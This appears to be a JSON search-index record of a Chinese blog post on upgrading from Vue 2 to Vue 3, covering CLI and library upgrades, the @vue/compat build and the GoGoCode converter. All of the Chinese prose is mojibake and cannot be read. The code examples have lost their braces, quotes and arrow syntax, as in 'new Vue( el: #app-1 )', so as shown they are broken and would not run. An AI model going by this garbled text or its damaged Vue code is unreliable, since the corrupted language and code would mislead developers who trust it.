[{"title":"Vue 2.x è‡³ 3.0 å¿«é€Ÿå‡çº§æŒ‡å—","path":"/2024/09/06/cde3266e5dbe/","content":"åº”è¯¥ä» 2 å‡çº§åˆ° 3 å—ï¼Ÿä»é•¿è¿œæ¥çœ‹ï¼Œå‡çº§åˆ° Vue 3 æ˜¯å¿…è¦çš„ã€‚æŠ€æœ¯åœ¨ä¸æ–­è¿›æ­¥ï¼ŒVue 3 åœ¨è®¸å¤šæ–¹é¢éƒ½ä¼˜äº Vue 2ï¼Œè®¸å¤šå…¬å¸åœ¨æ‹›è˜æ—¶ä¹Ÿå¼€å§‹å…³æ³¨å€™é€‰äººå¯¹ Vue 3 çš„æŒæ¡ã€‚å› æ­¤ï¼Œä¸ºäº†èŒä¸šå‘å±•ï¼Œå°½æ—©å­¦ä¹  Vue 3 æ˜¯éå¸¸é‡è¦çš„ã€‚ è™½ç„¶æœ‰äº›äººå¯èƒ½ä¼šè§‰å¾—å­¦ä¹ å‹åŠ›å¤§ï¼Œæˆ–è€…â€œå·ä¸åŠ¨â€ï¼Œä½†ä¸åŠªåŠ›å­¦ä¹ å¯èƒ½ä¼šå½±å“æœªæ¥çš„å°±ä¸šæœºä¼šã€‚ç°å®ä¸ä¼šå› ä¸ºä¸ªäººçš„å›°éš¾è€Œåœæ»ä¸å‰ã€‚å› æ­¤ï¼Œå¤§å®¶è¦åŠ æ²¹ï¼ å¯¹äºè€æ—§çš„ä¸­å¤§å‹é¡¹ç›®ï¼Œå»ºè®®ç»§ç»­ä½¿ç”¨ Vue 2ï¼Œå› ä¸ºå‡çº§å¯èƒ½ä¼šå¸¦æ¥è¾ƒé«˜çš„æˆæœ¬å’Œé£é™©ã€‚è€Œå¯¹äºæ–°é¡¹ç›®ï¼Œæœ€å¥½é€‰æ‹© Vue 3ï¼Œå› ä¸ºå…¶æ–°çš„ç‰¹æ€§ï¼Œå¦‚å“åº”å¼åŸç†å’Œ Composition APIï¼Œç¡®å®èƒ½å¸¦æ¥æ›´é«˜çš„ä¾¿æ·æ€§å’Œå¼€å‘æ•ˆç‡ã€‚ ç‰ˆæœ¬å·®å¼‚Vue3 çš„å‡ºç°ç¡®å®è§£å†³äº† Vue2 é•¿ä¹…ä»¥æ¥çš„ä¸€äº›ç—›ç‚¹ï¼Œæ¯”å¦‚ç»„ä»¶é€»è¾‘å¤ç”¨å¿…é¡»ä¾èµ– Mixin çš„æ¶æ„ç¼ºé™·ï¼Œå¯¼è‡´äº†è®¸å¤šæ‰©å±•æ€§çš„é—®é¢˜ï¼Œå¹¶ä¸”ç ´åäº†ç®€æ´ç»„ä»¶å£°æ˜çš„è®¸å¤šåŸåˆ™ã€‚åˆæ¯”å¦‚ Vue2 å¯¹ TS çš„æ”¯æŒä¸å¤Ÿï¼Œå¯¼è‡´åœ¨ Vu2 ä¸­ä½¿ç”¨ TS å¼‚å¸¸çš„æ†‹å±ˆéš¾å—ã€‚å› æ­¤ Vue3 çš„æ¶æ„å½»åº•é‡æ„ï¼Œæ˜¯æå…¶æœ‰æ„ä¹‰çš„ï¼Œä¸ä»…è§£å†³äº†ä¸Šè¿°çš„é—®é¢˜ï¼Œè¿˜åœ¨æ†ç»‘åŒ…å¤§å°ã€åˆå§‹æ¸²æŸ“ã€æ›´æ–°å’Œå†…å­˜ä½¿ç”¨ç­‰æ€§èƒ½æ–¹é¢æ¯” Vue2 æœ‰äº†æ›´å¤šçš„æå‡ã€‚ æ­¤å¤–ï¼ŒVue3 è¿˜æ·»åŠ äº†è®¸å¤šæ–°çš„åŠŸèƒ½ï¼š ç»„åˆå¼ API* å•æ–‡ä»¶ç»„ä»¶ä¸­çš„ç»„åˆå¼ API è¯­æ³•ç³– ()* Teleport ç»„ä»¶ Fragments ç‰‡æ®µ Emits ç»„ä»¶é€‰é¡¹** æ¥è‡ª@vue/runtime-core çš„ createRendererAPI ç”¨æ¥åˆ›å»ºè‡ªå®šä¹‰æ¸²æŸ“å‡½æ•° å•æ–‡ä»¶ç»„ä»¶ä¸­çš„çŠ¶æ€é©±åŠ¨çš„ CSS å˜é‡ (ä¸­çš„ v-bind)* SFCæ–°å¢å…¨å±€è§„åˆ™å’Œé’ˆå¯¹æ’æ§½å†…å®¹çš„è§„åˆ™ Suspense å®éªŒæ€§ å¦‚æ­¤å¤§çš„ç‰ˆæœ¬æ›´æ–°ï¼Œè‡ªç„¶ä¼šå¸¦æ¥è®¸å¤šç ´åæ€§æ›´æ–°ï¼Œè¿™äº›æ›´æ–°çš„è¿ç§»éš¾åº¦å¦‚ä¸‹ï¼š æ¥è‡ªå®˜æ–¹è¿ç§»æ–‡æ¡£çš„ä¸å…¼å®¹åˆ—è¡¨ï¼šéå…¼å®¹æ€§æ”¹å˜ | Vue 3 è¿ç§»æŒ‡å— (vuejs.org) æ¡†æ¶çš„çœŸæ­£åŠ›é‡æ¥è‡ªå…¶å‘¨å›´çš„ç¤¾åŒºå’Œç”Ÿæ€ç³»ç»Ÿï¼Œéšç€ Vu3 å‘å¸ƒï¼Œç¤¾åŒºä¹Ÿæ˜¯é—»å£°è€ŒåŠ¨ï¼Œåœ¨ Vue2 æ—¶ä»£æˆ‘ä»¬ç†Ÿæ‚‰çš„å·¥å…·æˆ–å‡çº§è·Ÿä¸Š Vue3 çš„è„šæ­¥ï¼Œæˆ–åœæ­¢ç»´æŠ¤è¢«æ—¶ä»£æŠ›å¼ƒã€‚å› æ­¤ï¼ŒVue çš„æ”¯æŒåº“å˜æ›´å¦‚ä¸‹ï¼š Vue2 Vue3 æ„å»ºå·¥å…·é“¾ Vue CLI 3.x Vue CLI 4.x / Vite çŠ¶æ€ç®¡ç† Vuex 3.x Vuex 4.x Router Vue Router 3.x Vue Router 4.x Devtools Devtools Extension 5.x Devtools Extension 6.x IDE æ”¯æŒ Vetur Volar TypeScript å‘½ä»¤è¡Œå·¥å…· vue-tsc é™æ€ç½‘ç«™ç”Ÿæˆ VuePress VitePress JSX @vue/babel-preset-jsx @vue/babel-plugin-jsx å¼€å§‹è¿ç§»è„šæ‰‹æ¶å‡çº§å‡çº§ Vue CLIï¼ŒVueï¼ŒVuex åŠ Vue Router ç­‰å·¥å…·ï¼ŒVue 3 éœ€è¦çš„æœ€ä½ç‰ˆæœ¬åœ¨ä¸Šé¢å·²ç»åˆ—å‡ºï¼Œå»ºè®®å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ Vue CLI å‡çº§å…¨å±€çš„ Vue CLI åŒ…ï¼Œè¯·è¿è¡Œï¼š npm update -g @vue/cli# æˆ–è€…yarn global upgrade --latest @vue/cli ä¸Šé¢åˆ—å‡ºæ¥çš„å‘½ä»¤æ˜¯ç”¨äºå‡çº§å…¨å±€çš„ Vue CLIã€‚å¦‚éœ€å‡çº§é¡¹ç›®ä¸­çš„ Vue CLI ç›¸å…³æ¨¡å—ï¼ˆä»¥ @vue/cli-plugin- æˆ– vue-cli-plugin- å¼€å¤´ï¼‰ï¼Œè¯·åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ vue upgradeï¼š ç”¨æ³•ï¼š upgrade [options] [plugin-name]å‡çº§ Vue CLI æœåŠ¡åŠæ’ä»¶é€‰é¡¹ï¼š -t, --to version å‡çº§ plugin-name åˆ°æŒ‡å®šçš„ç‰ˆæœ¬ -f, --from version è·³è¿‡æœ¬åœ°ç‰ˆæœ¬æ£€æµ‹ï¼Œé»˜è®¤æ’ä»¶æ˜¯ä»æ­¤å¤„æŒ‡å®šçš„ç‰ˆæœ¬å‡çº§ä¸Šæ¥ -r, --registry url ä½¿ç”¨æŒ‡å®šçš„ registry åœ°å€å®‰è£…ä¾èµ– --all å‡çº§æ‰€æœ‰çš„æ’ä»¶ --next æ£€æŸ¥æ’ä»¶æ–°ç‰ˆæœ¬æ—¶ï¼ŒåŒ…æ‹¬ alpha/beta/rc ç‰ˆæœ¬åœ¨å†… -h, --help è¾“å‡ºå¸®åŠ©å†…å®¹ Vue/Vuex /Vue Router npm install vue@latest vuex@latest vue-router@latest Vue CLI å’Œ Vuex ä»å¿«é€Ÿè¿ç§»çš„è§’åº¦è€ƒè™‘å¯ä»¥å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä½†æ˜¯æœ‰æ—¶é—´æœ‰ç²¾åŠ›çš„è¯è¿˜æ˜¯æ¨èè¿ç§»åˆ°å®˜æ–¹æœ€æ–°æ¨èçš„å·¥å…·åº“ï¼Œä»¥ä¸‹æœ‰äº›è¿ç§»èµ„æ–™å¯ä¾›å‚è€ƒï¼š Vue CLI - Vite/Rspack Vue CLI - æ¥è‡ª VueSchool.io çš„ Vite è¿ç§»æŒ‡å— æœ‰åŠ©äºè‡ªåŠ¨è¿ç§»çš„å·¥å…·/æ’ä»¶ Vue CLI - Rsbuild Vuex - Pinia ä» Vuex â‰¤4 è¿ç§» | Pinia (vuejs.org) ä»£ç è¿ç§»åœ¨æ­£å¼ä¿®æ”¹ä¸šåŠ¡ä»£ç ä¹‹å‰ï¼Œéœ€è¦å…ˆä¿®æ”¹å…¨å±€ API å®ä¾‹ï¼Œåœ¨ Vue2 ä¸­æŠ€æœ¯ä¸Šæ˜¯æ²¡æœ‰ â€œappâ€çš„æ¦‚å¿µï¼Œæˆ‘ä»¬å®šä¹‰çš„åº”ç”¨åªæ˜¯é€šè¿‡ new Vue() åˆ›å»ºçš„æ ¹ Vue å®ä¾‹ã€‚ä»åŒä¸€ä¸ª Vue æ„é€ å‡½æ•°åˆ›å»ºçš„æ¯ä¸ªæ ¹å®ä¾‹å…±äº«ç›¸åŒçš„å…¨å±€é…ç½®ï¼Œå› æ­¤ä½¿å¾—åœ¨åŒä¸€é¡µé¢ä¸Šçš„å¤šä¸ªâ€œåº”ç”¨â€åœ¨å…¨å±€é…ç½®ä¸åŒæ—¶å…±äº«åŒä¸€ä¸ª Vue å‰¯æœ¬éå¸¸å›°éš¾ï¼š // è¿™ä¼šå½±å“åˆ°æ‰€æœ‰æ ¹å®ä¾‹Vue.mixin( /* ... */)const app1 = new Vue( el: #app-1 )const app2 = new Vue( el: #app-2 ) ä¸ºäº†é¿å…è¿™äº›é—®é¢˜ï¼Œåœ¨ Vue 3 ä¸­æˆ‘ä»¬å¼•å…¥äº†ä¸€ä¸ªæ–°çš„å…¨å±€ APIï¼šfont style=color:rgb(60, 60, 67);createApp/font ä¿®æ”¹ Vue / Vue Router / Vuex åˆå§‹åŒ– Vue - å®˜æ–¹è¿ç§»æŒ‡å—ï¼šå…¨å±€ API åº”ç”¨å®ä¾‹ | Vue 3 è¿ç§»æŒ‡å— (vuejs.org) import createApp from vue;import MyApp from ./MyApp.vue;const app = createApp(MyApp);app.component(button-counter, data: () = ( count: 0, ), template: button @click=count++Clicked count times./button,);app.directive(focus, mounted: (el) = el.focus(),);// ç°åœ¨ï¼Œæ‰€æœ‰é€šè¿‡ app.mount() æŒ‚è½½çš„åº”ç”¨å®ä¾‹åŠå…¶ç»„ä»¶æ ‘ï¼Œ// å°†å…·æœ‰ç›¸åŒçš„ â€œbutton-counterâ€ ç»„ä»¶å’Œ â€œfocusâ€ æŒ‡ä»¤ï¼Œ// è€Œä¸ä¼šæ±¡æŸ“å…¨å±€ç¯å¢ƒapp.mount(#app); åº”ç”¨å®ä¾‹æš´éœ²äº† Vue 2 å…¨å±€ API çš„ä¸€ä¸ªå­é›†ï¼Œç»éªŒæ³•åˆ™æ˜¯ï¼Œä»»ä½•å…¨å±€æ”¹å˜ Vue è¡Œä¸ºçš„ API ç°åœ¨éƒ½ä¼šç§»åŠ¨åˆ°åº”ç”¨å®ä¾‹ä¸Šï¼Œä»¥ä¸‹æ˜¯ Vue2 å…¨å±€ API åŠå…¶ç›¸åº”çš„å®ä¾‹ API åˆ—è¡¨ï¼š 2.x å…¨å±€ API 3.x å®ä¾‹ API (**app**) Vue.config app.config Vue.config.productionTip ç§»é™¤ Vue.config.ignoredElements app.config.compilerOptions.isCustomElement Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties Vue.extend ç§»é™¤ Vuex - å®˜æ–¹è¿ç§»æŒ‡å—ï¼šä» 3.x è¿ç§»åˆ° 4.0 | Vuex (vuejs.org) ä» 3.x è¿ç§»åˆ° 4.0 å‡ ä¹æ‰€æœ‰çš„ Vuex 4 API éƒ½ä¸ Vuex 3 ä¿æŒä¸å˜ã€‚ä½†æ˜¯ï¼Œä»æœ‰ä¸€äº›éå…¼å®¹æ€§å˜æ›´éœ€è¦æ³¨æ„ã€‚ æœ€é‡è¦çš„æ˜¯ä¸ºäº†ä¸ Vue 3 åˆå§‹åŒ–è¿‡ç¨‹ä¿æŒä¸€è‡´ï¼ŒVuex çš„å®‰è£…æ–¹å¼å·²ç»æ”¹å˜äº†ã€‚ç”¨æˆ·ç°åœ¨åº”è¯¥ä½¿ç”¨æ–°å¼•å…¥çš„ createStore æ–¹æ³•æ¥åˆ›å»º store å®ä¾‹ã€‚ import createStore from vuex;export const store = createStore( state() return count: 1, ; ,); è¦å°† Vuex å®‰è£…åˆ° Vue å®ä¾‹ä¸­ï¼Œéœ€è¦ç”¨ store æ›¿ä»£ä¹‹å‰çš„ Vuex ä¼ é€’ç»™ use æ–¹æ³•ã€‚ import createApp from vue;import store from ./store;import App from ./App.vue;const app = createApp(App);app.use(store);app.mount(#app); Vue Router - å®˜æ–¹è¿ç§»æŒ‡å—ï¼šä» Vue2 è¿ç§» | Vue Router (vuejs.org) ä¸¾ä¸€åä¸€ï¼Œå¼•å…¥äº† font style=color:rgb(255, 80, 44);background-color:rgb(255, 245, 245);createRouter/font å‡½æ•°ï¼Œå®ƒå–ä»£äº†ä¹‹å‰çš„ font style=color:rgb(255, 80, 44);background-color:rgb(255, 245, 245);new Router()/font ç”¨æ³•ã€‚ // ä»¥å‰æ˜¯// import Router from vue-routerimport createRouter from vue-router;const router = createRouter( // ...); ç¬¬ä¸‰æ–¹åº“è¿ç§»è¿™ä¸€æ­¥æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸»è¦çœ‹ä½ ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“å¯¹ Vue3 çš„æ”¯æŒç¨‹åº¦ï¼Œå¹¸è¿çš„æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ UI åº“åƒ AntdVï¼ŒElement ç­‰éƒ½æ˜¯æ”¯æŒ Vue3 çš„ï¼ŒæŒ‰ç…§å®˜æ–¹çš„è¿ç§»æ–‡æ¡£ä¿®æ”¹å³å¯ã€‚ å¯¹äºä¸æ”¯æŒ Vue3 çš„åº“ï¼Œå¯ä»¥çœ‹çœ‹ awesome-vue åˆ—è¡¨ï¼ŒVue çš„ç¤¾åŒºè¿™ä¹ˆæ´»è·ƒï¼Œæƒ³å¿…æ‰¾ä¸ª Vue3 çš„å¹³æ›¿è¿˜æ˜¯ä¸éš¾çš„ã€‚ ä¸šåŠ¡ä»£ç è¿ç§»æœ€åå°±æ¥åˆ°ä¸šåŠ¡ä»£ç è¿ç§»ç¯èŠ‚äº†ï¼Œè¿™ä¸€æ­¥éœ€è¦æŒ‰ç…§å®˜æ–¹çš„ä¸å…¼å®¹åˆ—è¡¨ï¼Œé€ä¸ªæ¨¡å—ï¼Œé€ä¸ªæ–‡ä»¶çš„ä¿®æ”¹äº†ã€‚ åä¸ªç™¾ä¸ªæ–‡ä»¶è¿˜å¥½ï¼Œä½†æ˜¯ä¸€äº›è¿­ä»£äº†æ•°å¹´çš„é¡¹ç›®ï¼Œæ–‡ä»¶å¯èƒ½ä¼šè¾¾åˆ°ä¸Šåƒä¸ªï¼ŒæŒ¨ä¸ªæ–‡ä»¶æ‰‹åŠ¨æ£€æŸ¥ä¿®æ”¹çš„è¯ï¼Œä¸ä»…éº»çƒ¦ï¼Œè€Œä¸”çœŸçš„å¾ˆå®¹æ˜“è®©äººå´©æºƒï¼Œé‚£æœ‰æ²¡æœ‰è‡ªåŠ¨åŒ–å·¥å…·å¸®æˆ‘ä»¬å®Œæˆè¿™ä¸€æ­¥ã€‚ è‡ªåŠ¨åŒ–å·¥å…·åœ¨å‰ç«¯ç¤¾åŒºåªè¦æ˜¯å¹¿æ³›çš„éœ€æ±‚è‡ªç„¶å°±ä¸ç¼ºå°‘ç›¸åº”çš„è½®å­å»è§£å†³å®ƒï¼Œå¹¶ä¸”è¿˜æœ‰ä¸¤ç§è§£å†³æ€è·¯ï¼š è¿è¡Œæ—¶å…¼å®¹Vue 3 æä¾›äº†ä¸€ä¸ªå…¼å®¹æ€§æ„å»ºï¼ˆfont style=color:rgb(38, 38, 38);@vue/compat/fontï¼‰ï¼Œå…è®¸ä½ åœ¨ Vue 3 ä¸­ä½¿ç”¨ Vue 2 çš„ APIã€‚è¿™ä½¿å¾—é€æ­¥è¿ç§»æˆä¸ºå¯èƒ½ã€‚ä½ å¯ä»¥åœ¨é¡¹ç›®ä¸­åŒæ—¶ä½¿ç”¨ Vue 2 å’Œ Vue 3 çš„ç‰¹æ€§ã€‚ å®‰è£…æµç¨‹ï¼š å‡çº§è„šæ‰‹æ¶ æŒ‰ç…§ 3.1 çš„æ­¥éª¤å‡çº§è„šæ‰‹æ¶ï¼Œå¯ä»¥ä»…å‡çº§ Vue CLIï¼Œfont style=color:rgb(38, 38, 38);@vue/compat/fontå…¼å®¹ Vue2 çš„å…¨å±€ API å®ä¾‹ åœ¨ package.json é‡Œï¼Œå°† vue æ›´æ–°åˆ° 3.1ï¼Œå®‰è£…ç›¸åŒç‰ˆæœ¬çš„ @vue/compatã€‚ä¸”å¦‚æœå­˜åœ¨ vue-template-compiler çš„è¯ï¼Œå°†å…¶æ›¿æ¢ä¸º @vue/compiler-sfcã€‚ dependencies: - vue: ^2.6.12,+ vue: ^3.1.0,+ @vue/compat: ^3.1.0 ...,devDependencies: - vue-template-compiler: ^2.6.12+ @vue/compiler-sfc: ^3.1.0 åœ¨æ„å»ºè®¾ç½®ä¸­ï¼Œä¸º vue è®¾ç½®åˆ«å @vue/compatï¼Œä¸”é€šè¿‡ Vue ç¼–è¯‘å™¨é€‰é¡¹å¼€å¯å…¼å®¹æ¨¡å¼ // vue.config.jsmodule.exports = chainWebpack: (config) = config.resolve.alias.set(vue, @vue/compat); config.module .rule(vue) .use(vue-loader) .tap((options) = return ...options, compilerOptions: compatConfig: MODE: 2, , , ; ); ,; å·²çŸ¥çš„é™åˆ¶ è™½ç„¶ @vue/compatå·²ç»å°½å¯èƒ½çš„æ¨¡ä»¿ Vue 2 çš„è¡Œä¸ºï¼Œä½†æ˜¯è¿ç§»æ„å»ºç‰ˆæœ¬æ—¨åœ¨è¦†ç›–åœ¨æ–‡æ¡£ä¸­å…¬å¼€è®°è½½çš„ Vue 2 API å’Œè¡Œä¸ºã€‚å¦‚æœåº”ç”¨ä¾èµ–äº†æœªè®°è½½çš„è¡Œä¸ºå¯¼è‡´åœ¨è¿ç§»æ„å»ºä¸‹è¿è¡Œå¤±è´¥ï¼Œå®˜æ–¹ä¹Ÿå¯èƒ½ä¸å¤ªä¼šè°ƒæ•´è¿ç§»æ„å»ºç‰ˆæœ¬ä»¥è¿åˆè¿™ç§ç‰¹æ®Šæƒ…å†µã€‚æœ€å¸¸è§çš„å°±æ˜¯ä½¿ç”¨ VNodes ä¸Šçš„ç§æœ‰ propertyï¼Œè¿™åœ¨å„å¤§ç»„ä»¶åº“ä¸­å°¤ä¸ºå¸¸è§ï¼Œè¯¸å¦‚ Element UIï¼ŒAntV ç­‰éƒ½æœ‰è¿™äº›é—®é¢˜ï¼Œå› æ­¤è¿˜éœ€è¦è¿ç§»è‡³å®ƒä»¬çš„ Vue 3 å…¼å®¹ç‰ˆæœ¬ã€‚è¿™ä¹Ÿæ³¨å®šäº†å³ä½¿æœ‰è¿è¡Œæ—¶å…¼å®¹æ–¹æ¡ˆï¼Œå¯ä»¥å…¼å®¹ Vue2 å’Œ Vue3 çš„ä»£ç ï¼Œä»£ç è¿ç§»çš„å·¥ä½œä¾ç„¶ä¸ä¼šå°‘ã€‚ ä»£ç è½¬æ¢é™¤äº†è¿è¡Œæ—¶å…¼å®¹çš„æ–¹æ¡ˆï¼Œç¤¾åŒºå†…è¿˜å­˜åœ¨ç›´æ¥å°† Vue2 ä»£ç è½¬æ¢æˆ Vue3 çš„å·¥å…·ï¼Œè¿™é‡Œæ¨èâ€œé˜¿é‡Œå¦ˆå¦ˆâ€çš„ GoGoCodeã€‚ GoGoCode æ˜¯ä¸€æ¬¾ AST å¤„ç†å·¥å…·ï¼Œä»€ä¹ˆæ˜¯ ASTï¼ŸAST æ˜¯æºä»£ç çš„æŠ½è±¡è¯­æ³•ç»“æ„çš„æ ‘çŠ¶è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¿—ç§°çš„æŠ½è±¡è¯­æ³•æ ‘ï¼Œè¿™é‡Œå¤§å®¶å¯ä»¥ç±»æ¯”ä¹‹å‰æåˆ°è¿‡çš„è™šæ‹Ÿ DOM å»ç†è§£ï¼Œè™šæ‹Ÿ DOM æ˜¯å°†æˆ‘ä»¬çš„ DOM ç»“æ„æŠ½è±¡æˆå¦ä¸€ç§æ•°æ®ç»“æ„åœ¨å†…å­˜ä¸­è¿›è¡Œæ“ä½œï¼ŒæŠ½è±¡è¯­æ³•æ ‘ä¹Ÿæ˜¯ç±»ä¼¼çš„ä½œç”¨ï¼Œå°†æˆ‘ä»¬çš„ä»£ç æŠ½è±¡æˆå¦ä¸€ç§ç»“æ„æ¥æè¿°ã€‚ æ‰€ä»¥ GoGoCode å‡çº§ Vue3 çš„åŸç†ï¼Œå…¶å®å°±æ˜¯å°† Vue2 çš„ä»£ç æŠ½è±¡æˆ ASTï¼Œå†é€šè¿‡ AST åç¼–è¯‘æˆ Vue3 çš„è¯­æ³•ã€‚ ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘ä»¬å…³å¿ƒçš„é‡ç‚¹ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯çœ‹å®ƒèƒ½ä¸èƒ½æˆåŠŸåœ°å°† Vue2 å‡çº§åˆ° Vue3ï¼Œæˆ‘ä»¬ä»¥å®˜æ–¹æä¾›çš„è¿ç§»é¡¹ç›®ä¸ºä¾‹ï¼ˆvue-hackernews-2.0-masterï¼‰ï¼Œä½¿ç”¨ GoGoCode å¯¹è¯¥é¡¹ç›®è¿›è¡Œå‡çº§ï¼Œæ¥çœ‹ä¸€ä¸‹ GoGoCode èƒ½å¦å®Œæˆä¸€ä¸ªçœŸå®é¡¹ç›®çš„å‡çº§è½¬æ¢ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…æœ€æ–°çš„ gogocode-clï¼š npm install gogocode-cli -g å®‰è£…å®Œæˆåï¼Œåœ¨éœ€è¦å‡çº§çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œè¿è¡Œä¸‹é¢çš„æŒ‡ä»¤ï¼š gogocode -s ./src -t gogocode-plugin-vue -o ./src-out -s åé¢æŒ‡çš„æ˜¯éœ€è¦å‡çº§çš„æºç æ–‡ä»¶å¤¹ï¼Œ-o åé¢çš„å‚æ•°æŒ‡çš„æ˜¯å‡çº§åçš„ä»£ç è¾“å‡ºä½ç½®ï¼Œæ‰§è¡Œåçš„æ•ˆæœå¦‚ä¸‹ï¼š æˆ‘ä»¬ä»¥ router ä»£ç ä¸ºä¾‹ï¼Œçœ‹ä¸‹è½¬æ¢å‰åçš„å·®å¼‚ï¼š å¯ä»¥çœ‹åˆ°ï¼ŒVue2 ä¸­çš„ new Routerï¼ŒVue.use(Router) ç­‰æ–¹æ³•åœ¨è½¬æ¢åéƒ½å·²ç»è¢«ç§»é™¤äº†ï¼Œæ¢æˆä½¿ç”¨ createRouter æ¥åˆ›å»ºè·¯ç”±ï¼Œç¡®å®å·²ç»æ›´æ¢åˆ°äº† Vue3 çš„æ–¹æ³•äº†ã€‚ ä»£ç è½¬æ¢äº†è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬é¡¹ç›®çš„ä¾èµ–éƒ½è¦å‡çº§åˆ°å¯¹åº”ç‰ˆæœ¬ï¼ŒGoGoCode å¯ä»¥å¸®æˆ‘ä»¬æŠŠ package.json é‡Œé¢çš„ Vue/Vuex/Vue-router/Vue ç¼–è¯‘å·¥å…·å‡çº§åˆ°é€‚é… Vue3 çš„ç‰ˆæœ¬ï¼Œåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š gogocode -s package.json -t gogocode-plugin-vue -o package.json å‚æ•°æ ¼å¼ä¸ä»£ç çš„ä¸€è‡´ï¼Œæˆ‘ä»¬å°±ç›´æ¥å°†åŸ package.json æ–‡ä»¶è¦†ç›–äº†ï¼Œè½¬åŒ–æˆåŠŸåï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ package.json ä¾èµ–ç‰ˆæœ¬çš„å˜åŒ–ï¼š å‡çº§å®Œä¾èµ–åï¼Œå»ºè®®å†æ‰‹åŠ¨æ›´æ–°ä¸‹ Vue æŠ€æœ¯æ ˆç›¸å…³åº“ï¼Œgogocode ç”Ÿæˆçš„ç‰ˆæœ¬æœ‰ç‚¹ä½äº† è™½ç„¶ä½¿ç”¨äº†GoGoCodeï¼Œä½†ä¹Ÿä¸ä»£è¡¨æˆ‘ä»¬çš„é¡¹ç›®å°±å¯ä»¥ç›´æ¥å®Œæˆå‡çº§ï¼Œé¡¹ç›®ä¸­å¦‚æœç”¨åˆ°äº†å…¶ä»– Vue2 ç‰ˆæœ¬çš„ç»„ä»¶åº“ï¼Œè¿˜æ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±å»å‡çº§ Vue3 å¯¹åº”çš„ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬ä¸€äº› Api çš„å˜åŒ–éƒ½è¦æˆ‘ä»¬è‡ªå·±å»æ‰‹åŠ¨è°ƒæ•´ï¼Œå¹¶ä¸”ä½¿ç”¨GoGoCode ä¹Ÿæœ‰ä¸€äº›è½¬åŒ–è§„åˆ™æ˜¯ä¸æ”¯æŒçš„ï¼Œå…·ä½“çš„å¯ä»¥å‚è€ƒGoGoCode çš„è½¬åŒ–è§„åˆ™è¦†ç›–ã€‚ ç»éªŒåˆ†äº«è¿ç§»èŠ‚å¥ç›´æ¥è¯´ç»“è®ºï¼Œè¿ç§»æˆ˜çº¿ä¸å®œæ‹‰å¾—å¤ªé•¿ï¼Œç‰¹åˆ«æ˜¯æ–°åŠŸèƒ½æ¼”è¿›å’Œè¿ç§»å¹¶è¡Œæ—¶ï¼Œä¸æ–­çš„ä»£ç åˆå¹¶å’Œå†²çªè¿˜æ˜¯æŒºç—›è‹¦çš„ã€‚å› æ­¤æˆ‘è§‰å¾—è¿ç§»å¯ä»¥æŒ‰ç…§ä»¥ä¸‹èŠ‚å¥è¿›è¡Œï¼š å‡çº§ Vue CLI åŠç›¸å…³ä¾èµ–ï¼Œå¹¶ä¸”æ·»åŠ @vue/compatè¿è¡Œæ—¶å…¼å®¹æ–¹æ¡ˆ æ‰¾å‡ºæ‰€æœ‰ @vue/compatä¸å…¼å®¹çš„ä¸‰æ–¹åº“å’Œä¸šåŠ¡ä»£ç ï¼Œä¿®æ”¹åä¸Šçº¿ ä¿®æ”¹ Vue / Vuex / Vue Router çš„å…¨å±€ API åä¸Šçº¿ ä½¿ç”¨ GoGoCode æŒ‰æ¨¡å—çš„è½¬æ¢ä»£ç ï¼Œæ‰‹åŠ¨éªŒè¯åä¸Šçº¿ åœ¨è¿ç§»æ‰€æœ‰ä»£ç åå¹¶ä¸” @vue/compatä¹Ÿæ²¡æœ‰æç¤ºåï¼Œåˆ é™¤ @vue/compatä¸Šçº¿ æœ€åå¯é€‰çš„æ˜¯ Vue CLI å’Œ Vuex çš„è¿ç§»å·¥ä½œ è¿ç§»æˆæœ¬ä»¥æˆ‘æœ€è¿‘è¿ç§»çš„ä¸€ä¸ª Electron + Vue2 çš„é¡¹ç›®è¿ç§»æˆæœ¬æ¥ä¸¾ä¾‹ï¼š è¿ç§»è€—æ—¶ 60 äºº/æ—¥å·¦å³ï¼Œ311 å¤„æ–‡ä»¶æ”¹åŠ¨ï¼Œæ–°å¢ 30308 è¡Œä»£ç ï¼Œåˆ é™¤ 49927 è¡Œä»£ç  ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ”¹åŠ¨ä¸ä¼šè¿™ä¹ˆå¤§ï¼Œè¿™ä¸ªé¡¹ç›®æ˜¯ç”±äºä» AntV 1.x ç›´æ¥å‡çº§åˆ° 4.xï¼Œç‰ˆæœ¬å·®å¼‚è¿‡å¤§ï¼Œç›¸å½“å¤§çš„å°½åŠ›éƒ½æ˜¯è€—è´¹åœ¨ Antv çš„è¿ç§»ä¸Š æ€»ç»“ä½•æ—¶è¯¥å‡çº§ Vue 3ï¼Œä»€ä¹ˆæ—¶å€™è¯¥ç»§ç»­ä½¿ç”¨ Vue 2 çš„å…¼å®¹ç‰ˆæœ¬ã€‚ ç°åœ¨ï¼ŒVue 3 å®˜æ–¹ç”Ÿæ€æ•´ä½“ç¨³å®šï¼Œæ–°é¡¹ç›®å®Œå…¨å¯ç›´æ¥ Vue 3ã€‚é‚£äº›éœ€é•¿æœŸç»´æŠ¤çš„é¡¹ç›®ï¼Œä¹Ÿå¾ˆæœ‰å¿…è¦å‡çº§ï¼ŒVue 2 å·²ç»åœæ­¢æ›´æ–°ï¼Œå¦‚é¡¹ç›®éœ€å…¼å®¹ IE11ï¼Œå°±ç»§ç»­ç”¨ Vue 2.7ã€‚è¿™æ 